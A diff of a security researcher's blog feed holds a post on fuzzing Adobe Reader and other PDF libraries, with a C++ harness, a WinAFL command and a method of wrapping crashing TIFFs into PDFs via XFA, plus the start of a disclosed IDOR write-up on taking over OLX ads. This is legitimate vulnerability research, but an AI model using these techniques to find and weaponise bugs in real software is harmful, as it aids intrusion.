-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdfDoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;PDPage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdPage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdfDoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;RenderPage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drawPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLORSPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RESOLUTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pdfDoc</span><span class="p">.</span><span class="n">numPages</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">PDPage</span> <span class="n">pdPage</span> <span class="o">=</span> <span class="n">pdfDoc</span><span class="p">.</span><span class="n">getPage</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+            <span class="n">RenderPage</span> <span class="n">drawPage</span><span class="p">(</span><span class="n">pdPage</span><span class="p">,</span> <span class="n">COLORSPACE</span><span class="p">,</span> <span class="n">FILTER</span><span class="p">,</span> <span class="n">BPC</span><span class="p">,</span> <span class="n">RESOLUTION</span><span class="p">);</span>
 
-            &lt;span class=&quot;n&quot;&gt;PDPageRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            <span class="n">PDPageRelease</span><span class="p">(</span><span class="n">pdPage</span><span class="p">);</span>
+        <span class="p">}</span>
 
-        &lt;span class=&quot;n&quot;&gt;PDDocRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdfDoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getPDDoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;HANDLER&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Catched PDFL error&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;END_HANDLER&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        <span class="n">PDDocRelease</span><span class="p">(</span><span class="n">pdfDoc</span><span class="p">.</span><span class="n">getPDDoc</span><span class="p">());</span>
+    <span class="n">HANDLER</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Catched PDFL error"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="n">END_HANDLER</span>
+<span class="p">}</span>
 
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;PDFL init failed with code &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInitError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="n">libInit</span><span class="p">.</span><span class="n">isValid</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"PDFL init failed with code "</span> <span class="o">&lt;&lt;</span> <span class="n">libInit</span><span class="p">.</span><span class="n">getInitError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
 
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Requires input.pdf parameter&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Requires input.pdf parameter"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
 
-    &lt;span class=&quot;n&quot;&gt;fuzz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    <span class="n">fuzz</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
 
-&lt;p&gt;Now compile it, put it next to the PDFL dll’s, populate a small seed corpus (try ‘small.pdf’) and start fuzzing:&lt;/p&gt;
+<p>Now compile it, put it next to the PDFL dll’s, populate a small seed corpus (try ‘small.pdf’) and start fuzzing:</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-batch&quot; data-lang=&quot;batch&quot;&gt;c:\research\winafl\bin32\afl-fuzz.exe -t 10000+ -x c:\research\winafl\testcases\extras\pdf.dict -i c:\research\reader\in -o c:\research\reader\out -D C:\research\dr\bin32 ^
--- -fuzz_iterations 5000 -target_module harness.exe -nargs 1 -target_method fuzz -covtype edge ^
--coverage_module DL150PDFL.dll ^
--- harness.exe @@&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<figure class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="kd">c</span>:\research\winafl\bin32\afl<span class="na">-fuzz</span>.exe <span class="na">-t </span><span class="m">10000</span><span class="o">+</span> <span class="na">-x </span><span class="kd">c</span>:\research\winafl\testcases\extras\pdf.dict <span class="na">-i </span><span class="kd">c</span>:\research\reader\in <span class="na">-o </span><span class="kd">c</span>:\research\reader\out <span class="na">-D </span><span class="kd">C</span>:\research\dr\bin32 <span class="se">^
+</span><span class="o">--</span> <span class="na">-fuzz</span>_iterations <span class="m">5000</span> <span class="na">-target</span>_module <span class="kd">harness</span><span class="err">.exe</span> <span class="na">-nargs </span><span class="m">1</span> <span class="na">-target</span>_method <span class="kd">fuzz</span> <span class="na">-covtype </span><span class="kd">edge</span> <span class="se">^
+</span><span class="na">-coverage</span>_module <span class="kd">DL150PDFL</span>.dll <span class="se">^
+</span><span class="o">--</span> <span class="kd">harness</span><span class="err">.exe</span> @@</code></pre></figure>
 
-&lt;p&gt;Put this setup on a cloud vm and let it run for a while. Triage the crashes it finds daily against the real Acrobat Reader. Unfortunately for me this path did not work out the way I expected: PDFL crashes != actual Reader crashes.&lt;/p&gt;
+<p>Put this setup on a cloud vm and let it run for a while. Triage the crashes it finds daily against the real Acrobat Reader. Unfortunately for me this path did not work out the way I expected: PDFL crashes != actual Reader crashes.</p>
 
-&lt;p&gt;The exact same thing you can do for Foxit’s library. Actually got some real FoxitReader crashes here, but not exploitable again. Coding a harness for this one is just as easy and I’ll leave it up to you to have some fun with it.&lt;/p&gt;
+<p>The exact same thing you can do for Foxit’s library. Actually got some real FoxitReader crashes here, but not exploitable again. Coding a harness for this one is just as easy and I’ll leave it up to you to have some fun with it.</p>
 
-&lt;h2 id=&quot;better-understanding-the-pdf-file-format-libtiff&quot;&gt;Better understanding the PDF file format: libtiff&lt;/h2&gt;
-&lt;p&gt;Like I mentioned earlier, you might find out Adobe Reader uses libtiff when you disassemble the main executable or main dll. Same thing with libpng. So another idea would be to fuzz libtiff and wrap the crashing tiff’s into a PDF. You can fuzz libtiff using afl on Linux and get some nice speeds (12000/sec on 6 Xeon cores), this time I applied afl’s persistent mode as well.&lt;/p&gt;
+<h2 id="better-understanding-the-pdf-file-format-libtiff">Better understanding the PDF file format: libtiff</h2>
+<p>Like I mentioned earlier, you might find out Adobe Reader uses libtiff when you disassemble the main executable or main dll. Same thing with libpng. So another idea would be to fuzz libtiff and wrap the crashing tiff’s into a PDF. You can fuzz libtiff using afl on Linux and get some nice speeds (12000/sec on 6 Xeon cores), this time I applied afl’s persistent mode as well.</p>
 
-&lt;p&gt;If you want to wrap a tiff inside a PDF without changing the tiff a single bit, you can put it inside an XFA as an ImageField with base64 embedded image content. XFA is one of two ways to embed a form into a PDF. You want to automate this process, but you can start with a clean PDF shaped like this by using the Adobe AEM Forms Designer. Apparantly it’s now considered old and released for free (serial# on adobe.com), but the download link is quite hard to find.&lt;/p&gt;
+<p>If you want to wrap a tiff inside a PDF without changing the tiff a single bit, you can put it inside an XFA as an ImageField with base64 embedded image content. XFA is one of two ways to embed a form into a PDF. You want to automate this process, but you can start with a clean PDF shaped like this by using the Adobe AEM Forms Designer. Apparantly it’s now considered old and released for free (serial# on adobe.com), but the download link is quite hard to find.</p>
 
-&lt;p&gt;So after fuzzing libtiff for a couple of days and automatically wrapping all crashes into XFA’s into PDF’s and triaging the resulting PDF’s I did not get any worthwhile crashes. On the other hand, some of the PDF’s did manage to crash Adobe Reader 9.3, exploitable even! But that’s old stuff, I’m targeting the latest DC version. It appears Adobe hardens libtiff quite a bit, it’s not simply a copy of the latest open source version that they use.&lt;/p&gt;
+<p>So after fuzzing libtiff for a couple of days and automatically wrapping all crashes into XFA’s into PDF’s and triaging the resulting PDF’s I did not get any worthwhile crashes. On the other hand, some of the PDF’s did manage to crash Adobe Reader 9.3, exploitable even! But that’s old stuff, I’m targeting the latest DC version. It appears Adobe hardens libtiff quite a bit, it’s not simply a copy of the latest open source version that they use.</p>
 
-&lt;h2 id=&quot;coding-my-own-custom-fuzzer&quot;&gt;Coding my own custom fuzzer&lt;/h2&gt;
-&lt;p&gt;Almost out of ideas. I remember Corelan hinting you have to write your own fuzzers or everyone will find the same bugs. The art of fuzzing (PDF link at the end of this write-up) suggests the same.&lt;/p&gt;
+<h2 id="coding-my-own-custom-fuzzer">Coding my own custom fuzzer</h2>
+<p>Almost out of ideas. I remember Corelan hinting you have to write your own fuzzers or everyone will find the same bugs. The art of fuzzing (PDF link at the end of this write-up) suggests the same.</p>
 
-&lt;p&gt;Oh well. Let’s do it. :-)&lt;/p&gt;
+<p>Oh well. Let’s do it. :-)</p>
 
-&lt;p&gt;How do you start coding your own fuzzer? I would say there’s a certain amount of basic requirements:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Run a target application&lt;/li&gt;
-  &lt;li&gt;Feed the target your inputs&lt;/li&gt;
-  &lt;li&gt;Handle timeouts&lt;/li&gt;
-  &lt;li&gt;Catch crashes&lt;/li&gt;
-  &lt;li&gt;Fuzz inputs&lt;/li&gt;
-&lt;/ul&gt;
+<p>How do you start coding your own fuzzer? I would say there’s a certain amount of basic requirements:</p>
+<ul>
+  <li>Run a target application</li>
+  <li>Feed the target your inputs</li>
+  <li>Handle timeouts</li>
+  <li>Catch crashes</li>
+  <li>Fuzz inputs</li>
+</ul>
 
-&lt;p&gt;I started by reading through WinAFL and afl sourcecode to get an understanding of how this works. Soon enough I decided on writing both the fuzzer and a DynamoRIO client in C and use the client for getting code coverage. DR also allows you to catch exceptions (which could be crashes). Halfway there I figured out I like the speed of coding in Go better so now my fuzzing and orchestration logic is written in Go and the DynamoRIO part (the client) is written in C.&lt;/p&gt;
+<p>I started by reading through WinAFL and afl sourcecode to get an understanding of how this works. Soon enough I decided on writing both the fuzzer and a DynamoRIO client in C and use the client for getting code coverage. DR also allows you to catch exceptions (which could be crashes). Halfway there I figured out I like the speed of coding in Go better so now my fuzzing and orchestration logic is written in Go and the DynamoRIO part (the client) is written in C.</p>
 
-&lt;p&gt;My fuzzer is called What The Fuzz and is able to create an input queue based on a given seed and handle all the basic requirements I mentioned before. It runs on both Linux and Windows and finds crashes on xpdf in seconds. WTF even found crashes on FoxitReader within an hour or so, but unfortunately not exploitable so far.&lt;/p&gt;
+<p>My fuzzer is called What The Fuzz and is able to create an input queue based on a given seed and handle all the basic requirements I mentioned before. It runs on both Linux and Windows and finds crashes on xpdf in seconds. WTF even found crashes on FoxitReader within an hour or so, but unfortunately not exploitable so far.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/post_fuzzing-reader-wtf.png&quot; alt=&quot;What The Fuzz&quot; title=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/post_fuzzing-reader-wtf.png" alt="What The Fuzz" title="" /></p>
 
-&lt;p&gt;For now, it’s a chaos monkey leveraging Radamsa but I’m planning on actually coding the ‘code coverage guided fuzzing’ soon. Like @rantyben says in an epic presentation: start fuzzing with what you have, cold cores don’t add any value, meanwhile improve functionality.&lt;/p&gt;
+<p>For now, it’s a chaos monkey leveraging Radamsa but I’m planning on actually coding the ‘code coverage guided fuzzing’ soon. Like @rantyben says in an epic presentation: start fuzzing with what you have, cold cores don’t add any value, meanwhile improve functionality.</p>
 
-&lt;h1 id=&quot;about-vm-deployment--automation&quot;&gt;About vm deployment / automation&lt;/h1&gt;
-&lt;p&gt;Sure you can run fuzzers on your own laptop, but it will ruin your SSD and you can’t turn off your laptop. And it does not scale. You need remotely deployed vm’s, the more the better.&lt;/p&gt;
+<h1 id="about-vm-deployment--automation">About vm deployment / automation</h1>
+<p>Sure you can run fuzzers on your own laptop, but it will ruin your SSD and you can’t turn off your laptop. And it does not scale. You need remotely deployed vm’s, the more the better.</p>
 
-&lt;p&gt;You could use for instance a Windows 2008 Server image on a cloud provider and install your tooling.&lt;/p&gt;
+<p>You could use for instance a Windows 2008 Server image on a cloud provider and install your tooling.</p>
 
-&lt;p&gt;Another possibility is to create your own vm image using KVM + virt-manager and make sure it’s compatible with your preferred cloud provider (think about drivers like virtio). Deploy the image and you’re all set having your fully customized OS and tooling of choice, ready to fuzz!&lt;/p&gt;
+<p>Another possibility is to create your own vm image using KVM + virt-manager and make sure it’s compatible with your preferred cloud provider (think about drivers like virtio). Deploy the image and you’re all set having your fully customized OS and tooling of choice, ready to fuzz!</p>
 
-&lt;p&gt;Now set up some cronjobs or whatever kind of scheduled job you fancy. Backup your corpus every night. Sometimes cloud vm’s crash and you need to prepare for that.&lt;/p&gt;
+<p>Now set up some cronjobs or whatever kind of scheduled job you fancy. Backup your corpus every night. Sometimes cloud vm’s crash and you need to prepare for that.</p>
 
-&lt;h1 id=&quot;fun-does-not-always-mean-profit&quot;&gt;Fun does not always mean profit&lt;/h1&gt;
-&lt;p&gt;When you’ve continued reading this far you’ll have found out that I did not find any bugs in Adobe Reader itself, despite many attempts. Found a ton of bugs in lots of other software though. Every single time I thought: this is a smart idea, this should probably get me some bugs!&lt;/p&gt;
+<h1 id="fun-does-not-always-mean-profit">Fun does not always mean profit</h1>
+<p>When you’ve continued reading this far you’ll have found out that I did not find any bugs in Adobe Reader itself, despite many attempts. Found a ton of bugs in lots of other software though. Every single time I thought: this is a smart idea, this should probably get me some bugs!</p>
 
-&lt;p&gt;Because there’s no way to build an exploit if you don’t have the vulnerabilities, this is where it ends for now. Need an energy recharge to start looking into PDF’s again ;-)&lt;/p&gt;
+<p>Because there’s no way to build an exploit if you don’t have the vulnerabilities, this is where it ends for now. Need an energy recharge to start looking into PDF’s again ;-)</p>
 
-&lt;p&gt;So why did I release this research? Because I did not find that much research that explains in-depth on how (not) to fuzz this kind of targets. Often times you’ll get hints and from there you are on your own. Perhaps someone else can take it from here given my experiences so far. It will hopefully save you months of trial and error and inspire you to find more clever ways, or simply do what I did but throw many more VM’s at it and cross your fingers! Let me know if you get lucky.&lt;/p&gt;
+<p>So why did I release this research? Because I did not find that much research that explains in-depth on how (not) to fuzz this kind of targets. Often times you’ll get hints and from there you are on your own. Perhaps someone else can take it from here given my experiences so far. It will hopefully save you months of trial and error and inspire you to find more clever ways, or simply do what I did but throw many more VM’s at it and cross your fingers! Let me know if you get lucky.</p>
 
-&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
-&lt;p&gt;Definitely, check out the following resources on (PDF) fuzzing if you want to learn more:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://nordictestingdays.eu/files/files/jaanus_kaap_fuzzing.pdf&quot; target=&quot;_blank&quot;&gt;Jaanus Kääp: corpus distillation &amp;amp; fuzzing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/eu-16/materials/eu-16-Jurczyk-Effective-File-Format-Fuzzing-Thoughts-Techniques-And-Results.pdf&quot; target=&quot;_blank&quot;&gt;j00ru: effective file format fuzzing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html&quot; target=&quot;_blank&quot;&gt;René Freingruber: the art of Fuzzing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year-wp.pdf&quot; target=&quot;_blank&quot;&gt;Ke Liu: dig Into the Attack Surface of PDF and Gain 100+ CVEs in 1 Year&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
+<h1 id="resources">Resources</h1>
+<p>Definitely, check out the following resources on (PDF) fuzzing if you want to learn more:</p>
+<ul>
+  <li><a href="https://nordictestingdays.eu/files/files/jaanus_kaap_fuzzing.pdf" target="_blank">Jaanus Kääp: corpus distillation &amp; fuzzing</a></li>
+  <li><a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Jurczyk-Effective-File-Format-Fuzzing-Thoughts-Techniques-And-Results.pdf" target="_blank">j00ru: effective file format fuzzing</a></li>
+  <li><a href="https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html" target="_blank">René Freingruber: the art of Fuzzing</a></li>
+  <li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year-wp.pdf" target="_blank">Ke Liu: dig Into the Attack Surface of PDF and Gain 100+ CVEs in 1 Year</a></li>
+</ul>
 
-&lt;h1 id=&quot;whats-next&quot;&gt;What’s next&lt;/h1&gt;
-&lt;p&gt;Perhaps I’ll continue researching new angles with Adobe Reader. Perhaps I’ll switch to vm escapes. Malware analyses sounds fun. Hacking IoT sounds fun. Odds are I’ll be fuzzing some more and it might now be the time to follow a @richinseattle fuzzing training to add new insights and keep on learning.&lt;/p&gt;
+<h1 id="whats-next">What’s next</h1>
+<p>Perhaps I’ll continue researching new angles with Adobe Reader. Perhaps I’ll switch to vm escapes. Malware analyses sounds fun. Hacking IoT sounds fun. Odds are I’ll be fuzzing some more and it might now be the time to follow a @richinseattle fuzzing training to add new insights and keep on learning.</p>
 
-&lt;p&gt;Any suggestions would be very welcome, please hit me up on &lt;a href=&quot;https://twitter.com/kciredor_&quot; target=&quot;_blank&quot;&gt;Twitter @kciredor_&lt;/a&gt; or leave a comment below this post.&lt;/p&gt;
+<p>Any suggestions would be very welcome, please hit me up on <a href="https://twitter.com/kciredor_" target="_blank">Twitter @kciredor_</a> or leave a comment below this post.</p>
 
-&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+<p>Let’s keep on hacking!</p>
 
-&lt;p&gt;Cheers,
-kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">Binaries vs websites It has been half a year since my last blog post covering an IDOR in a website API. About time to write about something new and hopefully interesting! Having switched my focus from websites to binaries a new world opened up to me.</summary></entry><entry><title type="html">Taking over every Ad on OLX (automated), an IDOR story</title><link href="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html" rel="alternate" type="text/html" title="Taking over every Ad on OLX (automated), an IDOR story" /><published>2017-10-18T15:30:00+02:00</published><updated>2017-10-18T15:30:00+02:00</updated><id>https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story</id><content type="html" xml:base="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html">&lt;h1 id=&quot;public-disclosure&quot;&gt;Public disclosure&lt;/h1&gt;
-&lt;p&gt;Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!&lt;/p&gt;
+<p>Cheers,
+kciredor</p>]]></content><author><name>Roderick Schaefer</name></author><category term="exploits" /><category term="fuzzing" /><category term="pdf" /><category term="bugbounty" /><category term="infosec" /><summary type="html"><![CDATA[Binaries vs websites It has been half a year since my last blog post covering an IDOR in a website API. About time to write about something new and hopefully interesting! Having switched my focus from websites to binaries a new world opened up to me.]]></summary></entry><entry><title type="html">Taking over every Ad on OLX (automated), an IDOR story</title><link href="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html" rel="alternate" type="text/html" title="Taking over every Ad on OLX (automated), an IDOR story" /><published>2017-10-18T15:30:00+02:00</published><updated>2017-10-18T15:30:00+02:00</updated><id>https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story</id><content type="html" xml:base="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html"><![CDATA[<h1 id="public-disclosure">Public disclosure</h1>
+<p>Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!</p>
 
-&lt;h1 id=&quot;some-context&quot;&gt;Some context&lt;/h1&gt;
-&lt;p&gt;OLX powers the LetGo website for a couple of countries including The Netherlands. LetGo is an eBay like website, allowing you to buy new stuff and let go of old stuff.&lt;/p&gt;
+<h1 id="some-context">Some context</h1>
+<p>OLX powers the LetGo website for a couple of countries including The Netherlands. LetGo is an eBay like website, allowing you to buy new stuff and let go of old stuff.</p>
 
-&lt;p&gt;You can probably imagine the excitement I felt finding out I could take over an ad uploaded by someone else and change the pricing and details. The changes will have to go through a manual approval process, but from my repeated experience this ends up fine. Especially for example changing prices from 40 to 35 euros will always go through. Also it appears that after several approvals my account got whitelisted and approvals were not required anymore.&lt;/p&gt;
+<p>You can probably imagine the excitement I felt finding out I could take over an ad uploaded by someone else and change the pricing and details. The changes will have to go through a manual approval process, but from my repeated experience this ends up fine. Especially for example changing prices from 40 to 35 euros will always go through. Also it appears that after several approvals my account got whitelisted and approvals were not required anymore.</p>
 
